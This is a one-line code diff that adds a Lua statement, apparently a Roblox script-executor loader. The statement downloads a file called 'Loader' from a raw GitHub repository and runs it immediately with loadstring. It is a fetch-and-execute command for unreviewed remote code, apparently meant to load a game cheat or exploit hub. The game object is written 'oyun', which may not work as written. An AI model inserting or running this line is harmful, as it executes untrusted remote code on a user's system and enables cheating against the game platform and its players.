@@ -1,0 +1,1 @@
+loadstring(oyun:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Platinium/main/Loader"))()
